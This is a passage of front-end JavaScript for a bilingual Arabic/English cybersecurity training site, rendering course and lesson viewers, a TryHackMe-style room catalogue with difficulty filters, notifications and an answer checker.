          justify-content: center;
          margin-right: 15px;
          background: white;
        }
        .lesson-completed {
          background: #28a745;
          color: white;
        }
      </style>

      <!-- Course Header -->
      <div class="course-header">
        <div class="row">
          <div class="col-lg-8">
            <div class="d-flex align-items-center mb-3">
              <button class="btn btn-light btn-sm me-3" onclick="loadPage('courses')">
                <i class="fas fa-arrow-left"></i> ${txt('العودة', 'Back')}
              </button>
              <span class="badge bg-light text-dark">
                ${txt(
    course.level === 'beginner' ? 'مبتدئ' : course.level === 'intermediate' ? 'متوسط' : 'متقدم',
    course.level === 'beginner' ? 'Beginner' : course.level === 'intermediate' ? 'Intermediate' : 'Advanced'
  )}
              </span>
            </div>
            
            <h1 class="display-5 fw-bold mb-3">${currentLang === 'ar' ? course.titleAr : course.title}</h1>
            <p class="lead mb-4">${currentLang === 'ar' ? course.description : course.descriptionEn}</p>
            
            <div class="d-flex gap-4 flex-wrap">
              <span><i class="fas fa-clock me-2"></i>${course.duration}</span>
              <span><i class="fas fa-book me-2"></i>${course.modules.length} ${txt('وحدات', 'modules')}</span>
              <span><i class="fas fa-users me-2"></i>${course.students} ${txt('طالب', 'students')}</span>
              <span><i class="fas fa-star me-2"></i>${course.rating}/5</span>
            </div>
            
            ${progress > 0 ? `
              <div class="mt-4">
                <div class="d-flex justify-content-between mb-2">
                  <strong>${txt('التقدم الإجمالي', 'Overall Progress')}</strong>
                  <strong>${progress}%</strong>
                </div>
                <div class="progress" style="height: 15px;">
                  <div class="progress-bar" style="width: ${progress}%; background: linear-gradient(90deg, #667eea, #764ba2);"></div>
                </div>
              </div>
            ` : ''}
          </div>
        </div>
      </div>

      <div class="row">
        <!-- Main Content -->
        <div class="col-lg-8">
          <div class="course-content">
            <h3 class="mb-4">${txt('محتوى الكورس', 'Course Content')}</h3>
            
            ${course.modules.map((module, index) => {
    const moduleProgress = getModuleProgress(courseId, module.id);
    const moduleKey = `${courseId}-${module.id}`;
    const progressData = getProgress();
    const isModuleComplete = progressData.modules[moduleKey]?.completed || false;

    return `
                <div class="module-card">
                  <div class="module-header">
                    <div>
                      <h4 class="mb-2">
                        ${isModuleComplete ? '<i class="fas fa-check-circle text-success me-2"></i>' : `<span class="badge bg-secondary me-2">${index + 1}</span>`}
                        ${currentLang === 'ar' ? module.titleAr : module.title}
                      </h4>
                      <p class="text-muted mb-0">
                        <i class="fas fa-clock me-2"></i>${module.duration} • 
                        ${module.lessons.length} ${txt('دروس', 'lessons')}
                      </p>
                    </div>
                    <div class="text-end">
                      <div class="progress" style="width: 100px; height: 8px;">
                        <div class="progress-bar bg-success" style="width: ${moduleProgress}%"></div>
                      </div>
                      <small class="text-muted">${moduleProgress}%</small>
                    </div>
                  </div>
                  
                  <div class="lessons-list">
                    ${module.lessons.map(lesson => {
      const isCompleted = isLessonCompleted(courseId, module.id, lesson.id);

      return `
                        <div class="lesson-item" onclick="loadPage('module-viewer', '${courseId}/${module.id}')">
                          <div class="lesson-icon ${isCompleted ? 'lesson-completed' : ''}">
                            <i class="fas fa-${isCompleted ? 'check' : lesson.type === 'video' ? 'play' : lesson.type === 'lab' ? 'flask' : 'book'}"></i>
                          </div>
                          <div class="flex-grow-1">
                            <strong>${currentLang === 'ar' ? lesson.titleAr : lesson.title}</strong>
                            <div class="text-muted small">
                              <i class="fas fa-${lesson.type === 'video' ? 'video' : lesson.type === 'lab' ? 'laptop-code' : 'file-alt'} me-1"></i>
                              ${lesson.type === 'video' ? txt('فيديو', 'Video') : lesson.type === 'lab' ? txt('معمل', 'Lab') : txt('نص', 'Text')} • 
                              ${lesson.duration}
                            </div>
                          </div>
                          <i class="fas fa-chevron-right text-muted"></i>
                        </div>
                      `;
    }).join('')}
                    
                    ${module.quiz ? `
                      <div class="lesson-item" onclick="startQuiz('${courseId}', '${module.id}')">
                        <div class="lesson-icon" style="background: #ffc107;">
                          <i class="fas fa-question"></i>
                        </div>
                        <div class="flex-grow-1">
                          <strong>${module.quiz.title}</strong>
                          <div class="text-muted small">
                            <i class="fas fa-clipboard-check me-1"></i>
                            ${txt('اختبار', 'Quiz')} • ${module.quiz.questions.length} ${txt('أسئلة', 'questions')}
                          </div>
                        </div>
                        <i class="fas fa-chevron-right text-muted"></i>
                      </div>
                    ` : ''}
                  </div>
                </div>
              `;
  }).join('')}
          </div>
        </div>

        <!-- Sidebar -->
        <div class="col-lg-4">
          <div class="course-content">
            <h4 class="mb-4">${txt('ما ستتعلمه', 'What You Will Learn')}</h4>
            <ul class="list-unstyled">
              ${course.whatYouWillLearn.map(item => `
                <li class="mb-3">
                  <i class="fas fa-check-circle text-success me-2"></i>
                  ${item}
                </li>
              `).join('')}
            </ul>
            
            <hr class="my-4">
            
            <h4 class="mb-4">${txt('المهارات', 'Skills')}</h4>
            <div class="d-flex flex-wrap gap-2">
              ${course.skills.map(skill => `
                <span class="badge bg-light text-dark">${skill}</span>
              `).join('')}
            </div>
            
            ${course.certificate ? `
              <hr class="my-4">
              <div class="text-center">
                <i class="fas fa-certificate fa-3x text-warning mb-3"></i>
                <h5>${txt('شهادة إتمام', 'Certificate of Completion')}</h5>
                <p class="text-muted">${txt('احصل على شهادة عند إتمام الكورس', 'Get a certificate upon course completion')}</p>
              </div>
            ` : ''}
          </div>
        </div>
      </div>
    </div>
  `;
}

// Page: Module Viewer
function pageModuleViewer(courseId, moduleId) {
  const course = courses.find(c => c.id === courseId);
  if (!course) return '<h2>الكورس غير موجود</h2>';

  const module = course.modules.find(m => m.id === moduleId);
  if (!module) return '<h2>الوحدة غير موجودة</h2>';

  const currentLessonIndex = 0; // Default to first lesson
  const currentLesson = module.lessons[currentLessonIndex];

  return `
    <div class="container-fluid mt-4" style="height: calc(100vh - 100px);">
      <style>
        .module-viewer {
          display: flex;
          height: 100%;
          gap: 0;
        }
        .lessons-sidebar {
          width: 350px;
          background: white;
          border-radius: 15px 0 0 15px;
          overflow-y: auto;
          box-shadow: 2px 0 10px rgba(0,0,0,0.05);
        }
        .lesson-content {
          flex: 1;
          background: white;
          border-radius: 0 15px 15px 0;
          padding: 40px;
          overflow-y: auto;
        }
        .sidebar-header {
          padding: 25px;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          position: sticky;
          top: 0;
          z-index: 10;
        }
        .sidebar-lesson {
          padding: 15px 25px;
          border-bottom: 1px solid #e9ecef;
          cursor: pointer;
          transition: all 0.2s ease;
        }
        .sidebar-lesson:hover {
          background: #f8f9fa;
        }
        .sidebar-lesson.active {
          background: #e7f3ff;
          border-left: 4px solid #667eea;
        }
        .lesson-nav {
          display: flex;
          justify-content: space-between;
          margin-top: 40px;
          padding-top: 30px;
          border-top: 2px solid #e9ecef;
        }
      </style>

      <div class="module-viewer">
        <!-- Lessons Sidebar -->
        <div class="lessons-sidebar">
          <div class="sidebar-header">
            <button class="btn btn-light btn-sm mb-3" onclick="loadPage('course-viewer', '${courseId}')">
              <i class="fas fa-arrow-left"></i> ${txt('العودة للكورس', 'Back to Course')}
            </button>
            <h5 class="mb-2">${currentLang === 'ar' ? module.titleAr : module.title}</h5>
            <small>${module.lessons.length} ${txt('دروس', 'lessons')} • ${module.duration}</small>
          </div>
          
          ${module.lessons.map((lesson, index) => {
    const isCompleted = isLessonCompleted(courseId, moduleId, lesson.id);
    const isActive = index === currentLessonIndex;

    return `
              <div class="sidebar-lesson ${isActive ? 'active' : ''}" onclick="viewLesson('${courseId}', '${moduleId}', ${index})">
                <div class="d-flex align-items-center">
                  <div class="me-3">
                    ${isCompleted ?
        '<i class="fas fa-check-circle text-success"></i>' :
        `<i class="fas fa-${lesson.type === 'video' ? 'play-circle' : lesson.type === 'lab' ? 'flask' : 'file-alt'} text-muted"></i>`
      }
                  </div>
                  <div class="flex-grow-1">
                    <div><strong>${currentLang === 'ar' ? lesson.titleAr : lesson.title}</strong></div>
                    <small class="text-muted">${lesson.duration}</small>
                  </div>
                </div>
              </div>
            `;
  }).join('')}
          
          ${module.quiz ? `
            <div class="sidebar-lesson" onclick="startQuiz('${courseId}', '${moduleId}')">
              <div class="d-flex align-items-center">
                <div class="me-3">
                  <i class="fas fa-question-circle" style="color: #ffc107;"></i>
                </div>
                <div class="flex-grow-1">
                  <div><strong>${module.quiz.title}</strong></div>
                  <small class="text-muted">${module.quiz.questions.length} ${txt('أسئلة', 'questions')}</small>
                </div>
              </div>
            </div>
          ` : ''}
        </div>

        <!-- Lesson Content -->
        <div class="lesson-content">
          <div class="mb-4">
            <span class="badge bg-primary">${txt('درس', 'Lesson')} ${currentLessonIndex + 1}/${module.lessons.length}</span>
            ${currentLesson.type === 'video' ? '<span class="badge bg-danger ms-2"><i class="fas fa-video"></i> فيديو</span>' : ''}
            ${currentLesson.type === 'lab' ? '<span class="badge bg-warning ms-2"><i class="fas fa-flask"></i> معمل</span>' : ''}
          </div>
          
          <h2 class="mb-4">${currentLang === 'ar' ? currentLesson.titleAr : currentLesson.title}</h2>
          
          ${currentLesson.type === 'video' && currentLesson.videoUrl ? `
            <div class="video-container mb-4" style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; background: #000; border-radius: 10px;">
              <video controls style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;">
                <source src="${currentLesson.videoUrl}" type="video/mp4">
                متصفحك لا يدعم تشغيل الفيديو
              </video>
            </div>
          ` : ''}
          
          <div class="lesson-text">
            ${currentLesson.content.split('\n').map(line => {
    if (line.startsWith('#')) {
      const level = line.match(/^#+/)[0].length;
      const text = line.replace(/^#+\s*/, '');
      return `<h${level + 2}>${text}</h${level + 2}>`;
    } else if (line.startsWith('```')) {
      return '<pre><code>';
    } else if (line === '```') {
      return '</code></pre>';
    } else {
      return `<p>${line}</p>`;
    }
  }).join('')}
          </div>
          
          ${currentLesson.resources && currentLesson.resources.length > 0 ? `
            <div class="mt-5">
              <h4>${txt('موارد إضافية', 'Additional Resources')}</h4>
              <ul>
                ${currentLesson.resources.map(resource => `
                  <li><a href="${resource.url}" target="_blank">${resource.title}</a></li>
                `).join('')}
              </ul>
            </div>
          ` : ''}
          
          <!-- Lesson Navigation -->
          <div class="lesson-nav">
            <button class="btn btn-outline-primary" ${currentLessonIndex === 0 ? 'disabled' : ''} onclick="viewLesson('${courseId}', '${moduleId}', ${currentLessonIndex - 1})">
              <i class="fas fa-arrow-left"></i> ${txt('السابق', 'Previous')}
            </button>
            
            <button class="btn btn-success" onclick="markLessonComplete('${courseId}', '${moduleId}', '${currentLesson.id}')">
              <i class="fas fa-check"></i> ${txt('تم الإكمال', 'Mark Complete')}
            </button>
            
            <button class="btn btn-primary" ${currentLessonIndex === module.lessons.length - 1 ? 'disabled' : ''} onclick="viewLesson('${courseId}', '${moduleId}', ${currentLessonIndex + 1})">
              ${txt('التالي', 'Next')} <i class="fas fa-arrow-right"></i>
            </button>
          </div>
        </div>
      </div>
    </div>
  `;
}

// Helper function to view a specific lesson
function viewLesson(courseId, moduleId, lessonIndex) {
  // Store current lesson index
  window.currentLessonIndex = lessonIndex;
  loadPage('module-viewer', `${courseId}/${moduleId}`);
}

// Helper function to mark lesson as complete
function markLessonComplete(courseId, moduleId, lessonId) {
  const success = completeLesson(courseId, moduleId, lessonId);
  if (success) {
    showNotification(txt('تم! حصلت على 50 نقطة', 'Done! You earned 50 points'), 'success');
    setTimeout(() => {
      loadPage('module-viewer', `${courseId}/${moduleId}`);
    }, 1000);
  } else {
    showNotification(txt('تم إكمال هذا الدرس مسبقاً', 'This lesson is already completed'), 'info');
  }
}

// Helper notification function - TryHackMe style centered toast
function showNotification(message, type = 'info') {
  // Remove any existing notifications
  document.querySelectorAll('.thm-toast-notification').forEach(el => el.remove());

  const notification = document.createElement('div');
  const bgColor = type === 'info' ? '#3b82f6' : (type === 'success' ? '#22c55e' : (type === 'warning' ? '#f59e0b' : '#ef4444'));
  const iconClass = type === 'info' ? 'fa-info-circle' : (type === 'success' ? 'fa-check-circle' : (type === 'warning' ? 'fa-exclamation-triangle' : 'fa-times-circle'));
  const emoji = type === 'success' ? '🎉' : (type === 'error' ? '❌' : (type === 'warning' ? '⚠️' : 'ℹ️'));

  notification.className = 'thm-toast-notification';
  notification.innerHTML = `
      <div class="toast-icon">${emoji}</div>
      <div class="toast-content">
          <i class="fa-solid ${iconClass}"></i>
          <span>${message}</span>
      </div>
  `;
  notification.style.cssText = `
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0.8);
      background: linear-gradient(135deg, ${bgColor}, ${bgColor}dd);
      color: #fff;
      padding: 25px 40px;
      border-radius: 20px;
      font-weight: 700;
      font-size: 18px;
      z-index: 100000;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 15px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5), 0 0 0 4px ${bgColor}40;
      animation: toastPopIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
      text-align: center;
      min-width: 200px;
  `;

  // Add animation style if not exists
  if (!document.getElementById('toast-animation-style')) {
    const style = document.createElement('style');
    style.id = 'toast-animation-style';
    style.textContent = `
          @keyframes toastPopIn {
              0% { transform: translate(-50%, -50%) scale(0.5); opacity: 0; }
              100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
          }
          @keyframes toastPopOut {
              0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
              100% { transform: translate(-50%, -50%) scale(0.5); opacity: 0; }
          }
          .thm-toast-notification .toast-icon {
              font-size: 50px;
              line-height: 1;
          }
          .thm-toast-notification .toast-content {
              display: flex;
              align-items: center;
              gap: 10px;
          }
          .thm-toast-notification .toast-content i {
              font-size: 20px;
          }
      `;
    document.head.appendChild(style);
  }

  document.body.appendChild(notification);

  // Animate out and remove
  setTimeout(() => {
    notification.style.animation = 'toastPopOut 0.3s ease forwards';
    setTimeout(() => notification.remove(), 300);
  }, 2000);
}

// ==================== ROOMS PAGES ====================

// Page: All Rooms
function pageRooms() {
  const rooms = Object.values(roomsData);

  // Calculate stats - use lowercase difficulty
  const easyCount = rooms.filter(r => r.difficulty === 'easy').length;
  const mediumCount = rooms.filter(r => r.difficulty === 'medium').length;
  const hardCount = rooms.filter(r => r.difficulty === 'hard').length;

  // Calculate total points from tasks
  const totalPoints = rooms.reduce((sum, r) => {
    if (r.tasks && Array.isArray(r.tasks)) {
      return sum + r.tasks.reduce((s, t) => s + (t.points || 0), 0);
    }
    return sum + (r.points || 0);
  }, 0);

  // Category icons based on machineType
  const categoryIcons = {
    'terminal': 'fa-solid fa-terminal',
    'web': 'fa-solid fa-globe',
    'default': 'fa-solid fa-server'
  };

  return `
    <div class="container-fluid px-4 mt-4">
      <style>
        /* Rooms Page Styles - Matching CTF Design */
        .rooms-hero {
          background: linear-gradient(135deg, #1a0033 0%, #4a0080 50%, #1a0033 100%);
          border-radius: 24px;
          padding: 60px 40px;
          position: relative;
          overflow: hidden;
          margin-bottom: 2rem;
        }
        .rooms-hero::before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%239C92AC' fill-opacity='0.05'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%u003E%3C/g%3E%3C/svg%3E");
          animation: pulse 4s ease-in-out infinite;
        }
        @keyframes pulse {
          0%, 100% { opacity: 0.3; }
          50% { opacity: 0.6; }
        }
        .rooms-hero-content {
          position: relative;
          z-index: 1;
        }
        .rooms-title {
          font-size: 3rem;
          font-weight: 800;
          background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
          margin-bottom: 1rem;
        }
        .rooms-subtitle {
          color: #a0aec0;
          font-size: 1.2rem;
          max-width: 700px;
          margin: 0 auto 2rem;
        }
        .stat-card-rooms {
          background: rgba(255,255,255,0.05);
          backdrop-filter: blur(10px);
          border: 1px solid rgba(255,255,255,0.1);
          border-radius: 16px;
          padding: 24px;
          text-align: center;
          transition: all 0.3s ease;
        }
        .stat-card-rooms:hover {
          transform: translateY(-5px);
          border-color: rgba(240,147,251,0.3);
          box-shadow: 0 10px 40px rgba(240,147,251,0.1);
        }
        .stat-value-rooms {
          font-size: 2.5rem;
          font-weight: 700;
          margin-bottom: 0.5rem;
        }
        .stat-value-rooms.pink { color: #f093fb; }
        .stat-value-rooms.cyan { color: #00d9f5; }
        .stat-value-rooms.green { color: #10b981; }
        .stat-value-rooms.orange { color: #f5a623; }
        .stat-label-rooms {
          color: #718096;
          font-size: 0.9rem;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Filter Pills */
        .rooms-filter-pills {
          display: flex;
          gap: 12px;
          flex-wrap: wrap;
          justify-content: center;
          margin-bottom: 2rem;
        }
        .rooms-filter-pill {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 12px 24px;
          background: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.05) 100%);
          border: 1px solid rgba(255,255,255,0.15);
          border-radius: 50px;
          color: #fff;
          cursor: pointer;
          transition: all 0.3s ease;
          font-weight: 500;
        }
        .rooms-filter-pill:hover, .rooms-filter-pill.active {
          background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
          color: #fff;
          border-color: transparent;
          transform: translateY(-2px);
        }
        .rooms-filter-pill .count {
          background: rgba(0,0,0,0.2);
          padding: 2px 8px;
          border-radius: 10px;
          font-size: 0.8rem;
        }
        
        /* Room Cards - Enhanced */
        .room-card-enhanced {
          background: linear-gradient(145deg, #1e1e30 0%, #16162a 100%);
          border-radius: 20px;
          overflow: hidden;
          border: 1px solid rgba(255,255,255,0.08);
          transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
          height: 100%;
          display: flex;
          flex-direction: column;
        }
        .room-card-enhanced:hover {
          transform: translateY(-8px) scale(1.02);
          border-color: rgba(240,147,251,0.3);
          box-shadow: 0 20px 60px rgba(0,0,0,0.4), 0 0 40px rgba(240,147,251,0.1);
        }
        .room-card-header {
          padding: 30px 24px;
          text-align: center;
          position: relative;
        }
        .room-card-header.Easy { background: linear-gradient(135deg, rgba(16,185,129,0.2) 0%, rgba(56,239,125,0.1) 100%); }
        .room-card-header.Medium { background: linear-gradient(135deg, rgba(245,158,11,0.2) 0%, rgba(251,191,36,0.1) 100%); }
        .room-card-header.Hard { background: linear-gradient(135deg, rgba(239,68,68,0.2) 0%, rgba(244,92,67,0.1) 100%); }
        .room-card-icon {
          width: 70px;
          height: 70px;
          border-radius: 16px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 2rem;
          margin: 0 auto 16px;
        }
        .room-card-icon.Easy { background: linear-gradient(135deg, #10b981 0%, #38ef7d 100%); color: #0f0c29; }
        .room-card-icon.Medium { background: linear-gradient(135deg, #f59e0b 0%, #fbbf24 100%); color: #0f0c29; }
        .room-card-icon.Hard { background: linear-gradient(135deg, #ef4444 0%, #f45c43 100%); color: #fff; }
        .room-card-title {
          color: #fff;
          font-size: 1.3rem;
          font-weight: 700;
          margin-bottom: 8px;
        }
        .room-difficulty-badge {
          padding: 6px 16px;
          border-radius: 20px;
          font-size: 0.75rem;
          font-weight: 600;
          text-transform: uppercase;
          letter-spacing: 0.5px;
          display: inline-block;
        }
        .room-difficulty-badge.Easy {
          background: rgba(16, 185, 129, 0.2);
          color: #10b981;
          border: 1px solid rgba(16, 185, 129, 0.3);
        }
        .room-difficulty-badge.Medium {
          background: rgba(245, 158, 11, 0.2);
          color: #f59e0b;
          border: 1px solid rgba(245, 158, 11, 0.3);
        }
        .room-difficulty-badge.Hard {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
          border: 1px solid rgba(239, 68, 68, 0.3);
        }
        .room-card-body {
          padding: 24px;
          flex: 1;
          display: flex;
          flex-direction: column;
        }
        .room-card-desc {
          color: #718096;
          font-size: 0.9rem;
          line-height: 1.6;
          margin-bottom: 16px;
          flex: 1;
        }
        .room-card-meta {
          display: flex;
          gap: 16px;
          flex-wrap: wrap;
          color: #a0aec0;
          font-size: 0.85rem;
          margin-bottom: 16px;
        }
        .room-card-meta span {
          display: flex;
          align-items: center;
          gap: 6px;
        }
        .room-card-tags {
          display: flex;
          gap: 8px;
          flex-wrap: wrap;
          margin-bottom: 16px;
        }
        .room-card-tag {
          background: rgba(255,255,255,0.05);
          color: #a0aec0;
          padding: 4px 12px;
          border-radius: 6px;
          font-size: 0.75rem;
        }
        .room-card-btn {
          width: 100%;
          padding: 14px;
          border: none;
          border-radius: 12px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s ease;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
        }
        .room-card-btn.Easy {
          background: linear-gradient(135deg, #10b981 0%, #38ef7d 100%);
          color: #0f0c29;
        }
        .room-card-btn.Medium {
          background: linear-gradient(135deg, #f59e0b 0%, #fbbf24 100%);
          color: #0f0c29;
        }
        .room-card-btn.Hard {
          background: linear-gradient(135deg, #ef4444 0%, #f45c43 100%);
          color: #fff;
        }
        .room-card-btn:hover {
          transform: translateY(-2px);
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .room-progress-bar {
          width: 100%;
          height: 4px;
          background: rgba(255,255,255,0.1);
          border-radius: 2px;
          margin-top: 12px;
          overflow: hidden;
        }
        .room-progress-fill {
          height: 100%;
          border-radius: 2px;
          transition: width 0.3s ease;
        }
        .room-progress-fill.Easy { background: linear-gradient(90deg, #10b981 0%, #38ef7d 100%); }
        .room-progress-fill.Medium { background: linear-gradient(90deg, #f59e0b 0%, #fbbf24 100%); }
        .room-progress-fill.Hard { background: linear-gradient(90deg, #ef4444 0%, #f45c43 100%); }
        
        /* Animation */
        @keyframes fadeInUp {
          from {
            opacity: 0;
            transform: translateY(30px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-rooms {
          animation: fadeInUp 0.5s ease forwards;
          opacity: 0;
        }
      </style>

      <!-- Hero Section -->
      <div class="rooms-hero text-center">
        <div class="rooms-hero-content">
          <h1 class="rooms-title">
            <i class="fa-solid fa-door-open me-3"></i>${txt('الغرف التفاعلية', 'Interactive Rooms')}
          </h1>
          <p class="rooms-subtitle">${txt('تحديات عملية على طريقة TryHackMe. تعلم من خلال التطبيق العملي في بيئة آمنة.', 'Hands-on challenges TryHackMe style. Learn through practice in a safe environment.')}</p>
          
          <div class="row g-4 justify-content-center mb-4">
            <div class="col-6 col-md-3">
              <div class="stat-card-rooms animate-rooms" style="animation-delay: 0.1s">
                <div class="stat-value-rooms pink">${rooms.length}</div>
                <div class="stat-label-rooms">${txt('غرف', 'Rooms')}</div>
              </div>
            </div>
            <div class="col-6 col-md-3">
              <div class="stat-card-rooms animate-rooms" style="animation-delay: 0.2s">
                <div class="stat-value-rooms cyan">${totalPoints}</div>
                <div class="stat-label-rooms">${txt('نقطة متاحة', 'Points Available')}</div>
              </div>
            </div>
            <div class="col-6 col-md-3">
              <div class="stat-card-rooms animate-rooms" style="animation-delay: 0.3s">
                <div class="stat-value-rooms green">${rooms.reduce((sum, r) => sum + r.tasks.length, 0)}</div>
                <div class="stat-label-rooms">${txt('مهام', 'Tasks')}</div>
              </div>
            </div>
            <div class="col-6 col-md-3">
              <div class="stat-card-rooms animate-rooms" style="animation-delay: 0.4s">
                <div class="stat-value-rooms orange">0</div>
                <div class="stat-label-rooms">${txt('مكتملة', 'Completed')}</div>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <!-- Filter Pills -->
      <div class="rooms-filter-pills">
        <button class="rooms-filter-pill active" onclick="filterRoomsEnhanced('all')">
          <i class="fa-solid fa-layer-group"></i>
          <span>${txt('الكل', 'All')}</span>
          <span class="count">${rooms.length}</span>
        </button>
        <button class="rooms-filter-pill" onclick="filterRoomsEnhanced('easy')">
          <i class="fa-solid fa-leaf"></i>
          <span>${txt('سهل', 'Easy')}</span>
          <span class="count">${easyCount}</span>
        </button>
        <button class="rooms-filter-pill" onclick="filterRoomsEnhanced('medium')">
          <i class="fa-solid fa-fire"></i>
          <span>${txt('متوسط', 'Medium')}</span>
          <span class="count">${mediumCount}</span>
        </button>
        <button class="rooms-filter-pill" onclick="filterRoomsEnhanced('hard')">
          <i class="fa-solid fa-skull"></i>
          <span>${txt('صعب', 'Hard')}</span>
          <span class="count">${hardCount}</span>
        </button>
      </div>

      <!-- Rooms Grid -->
      <div class="row g-4" id="rooms-grid-enhanced">
        ${rooms.map((room, index) => {
    const icon = categoryIcons[room.machineType] || categoryIcons.default;
    const roomPoints = room.tasks ? room.tasks.reduce((sum, t) => sum + (t.points || 0), 0) : (room.points || 0);
    const difficulty = room.difficulty.charAt(0).toUpperCase() + room.difficulty.slice(1);
    const description = currentLang === 'ar' && room.scenarioAr ? room.scenarioAr : (room.scenario || room.description || '');
    const estimatedTime = room.estimatedMinutes ? `${room.estimatedMinutes} min` : '45 min';
    const tags = room.tools || ['linux', 'security'];
    return `
          <div class="col-md-6 col-lg-4 room-item-enhanced animate-rooms" style="animation-delay: ${0.1 + index * 0.05}s" data-difficulty="${room.difficulty}">
            <div class="room-card-enhanced">
              <div class="room-card-header ${difficulty}">
                <div class="room-card-icon ${difficulty}">
                  <i class="${icon}"></i>
                </div>
                <h4 class="room-card-title">${currentLang === 'ar' && room.titleAr ? room.titleAr : room.title}</h4>
                <span class="room-difficulty-badge ${difficulty}">${difficulty}</span>
              </div>
              <div class="room-card-body">
                <p class="room-card-desc">${description}</p>
                <div class="room-card-meta">
                  <span><i class="fa-regular fa-clock"></i> ${estimatedTime}</span>
                  <span><i class="fa-solid fa-list-check"></i> ${room.tasks ? room.tasks.length : 0} ${txt('مهام', 'tasks')}</span>
                  <span><i class="fa-solid fa-trophy"></i> ${roomPoints} ${txt('نقطة', 'pts')}</span>
                </div>
                <div class="room-card-tags">
                  ${tags.map(tag => `<span class="room-card-tag">#${tag}</span>`).join('')}
                </div>
                <button class="room-card-btn ${difficulty}" onclick="loadPage('room-viewer', '${room.id}')">
                  <i class="fa-solid fa-play"></i>
                  ${txt('ابدأ الغرفة', 'Start Room')}
                </button>
                <div class="room-progress-bar">
                  <div class="room-progress-fill ${difficulty}" style="width: 0%;"></div>
                </div>
              </div>
            </div>
          </div>
        `}).join('')}
      </div>
    </div>
  `;
}

// Enhanced filter for rooms
window.filterRoomsEnhanced = function (difficulty) {
  // Update active pill
  document.querySelectorAll('.rooms-filter-pill').forEach(pill => {
    pill.classList.remove('active');
  });
  event.target.closest('.rooms-filter-pill').classList.add('active');

  // Filter rooms
  document.querySelectorAll('.room-item-enhanced').forEach(item => {
    if (difficulty === 'all' || item.dataset.difficulty === difficulty) {
      item.style.display = 'block';
    } else {
      item.style.display = 'none';
    }
  });
};


// Filter rooms by difficulty
function filterRooms(difficulty) {
  document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
  event.target.classList.add('active');

  document.querySelectorAll('.room-item').forEach(item => {
    if (difficulty === 'all' || item.dataset.difficulty === difficulty) {
      item.style.display = 'block';
    } else {
      item.style.display = 'none';
    }
  });
}

// Enhanced Room Viewer Wrapper
function pageRoomViewer(roomId) {
  // Redirect to the new unified Room Viewer logic
  if (window.roomViewer && typeof window.roomViewer.loadRoom === 'function') {
    return window.roomViewer.loadRoom(roomId);
  }

  // Fallback if roomViewer is not loaded
  return `<div class="container mt-5 text-center">
      <div class="alert alert-danger">
        <h3>System Error</h3>
        <p>Room Viewer component not loaded.</p>
        <button class="btn btn-outline-danger" onclick="location.reload()">Refresh Page</button>
      </div>
    </div>`;
}
// Show specific task
window.showRoomTask = function (roomId, taskIndex) {
  const room = roomsData[roomId];
  if (!room) return;

  // Update tabs
  document.querySelectorAll('.task-tab').forEach((tab, i) => {
    tab.classList.toggle('active', i === taskIndex);
  });

  // Update content
  const contentArea = document.getElementById('task-content-area');
  if (contentArea && room.tasks[taskIndex]) {
    contentArea.innerHTML = renderTaskContent(room.tasks[taskIndex], roomId, taskIndex);
  }
};


// Show specific task
function showTask(taskIndex) {
  document.querySelectorAll('.task-btn').forEach((btn, i) => {
    btn.classList.toggle('active', i === taskIndex);
  });
  // Reload room with new task - simplified for now
}

// Check answer
function checkAnswer(roomId, questionId, correctAnswer, points) {
  const input = document.getElementById(`answer-${questionId}`);
  const userAnswer = input.value.trim();

  if (userAnswer.toLowerCase() === correctAnswer.toLowerCase()) {
    showNotification(`✅ ${txt('صحيح!', 'Correct!')} +${points} ${txt('نقطة', 'points')}`, 'success');
    input.style.background = '#28a745';
    input.disabled = true;

    // Save progress
    if (typeof completeChallenge === 'function') {
      completeChallenge(`${roomId}-${questionId}`, points);
    }
  } else {
    showNotification(`❌ ${txt('خطأ، حاول مرة أخرى', 'Wrong, try again')}`, 'danger');
    input.style.background = '#dc3545';
    setTimeout(() => { input.style.background = '#0f0f23'; }, 1000);
  }
}

// Start machine simulation
function startMachine() {
  const machineContent = document.getElementById('machine-content');
  const timerDiv = document.getElementById('machine-timer');
  const statusDiv = document.getElementById('machine-status');

  // Show loading
  machineContent.innerHTML = `
    <div class="text-center" style="color: white;">
      <div class="spinner-border text-success" style="width: 5rem; height: 5rem;"></div>
      <p style="color: #38ef7d; margin-top: 20px; font-size: 1.2rem;">${txt('جاري تشغيل البيئة الافتراضية...', 'Starting virtual environment...')}</p>
      <p style="color: #718096; font-size: 0.9rem;">${txt('يرجى الانتظار', 'Please wait')}</p>
    </div>
  `;

  // Simulate startup
